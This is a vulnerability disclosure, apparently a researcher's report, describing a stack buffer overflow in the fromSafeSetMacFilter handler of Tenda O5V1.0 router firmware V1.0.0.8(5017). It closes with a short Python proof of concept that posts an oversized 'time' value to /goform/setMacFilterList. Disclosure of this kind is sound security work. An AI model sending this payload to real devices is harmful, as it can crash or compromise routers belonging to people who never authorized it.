## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2833.html

## Affected version

O5V1.0 V1.0.0.8(5017)

## Vulnerability details

The Tenda O5V1.0 V1.0.0.8(5017) firmware has a stack overflow vulnerability in the `fromSafeSetMacFilter` function. The `v81, v78, v75` variable receives the `remark, type, time` parameter from a POST request. However, since the user can control the input of `remark, type, time`, the statement `sprintf` can cause a buffer overflow. The user-provided  `remark, type, time` can exceed the capacity of the `v21` array, triggering this security vulnerability.

![image-20240801132730120](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801132730120.png)

![image-20240801131835096](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801131835096.png)

![image-20240801131909571](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240801131909571.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setMacFilterList"
payload = b"a"*5000

data = {"action": "add", "time": payload}
response = requests.post(url, data=data)
```
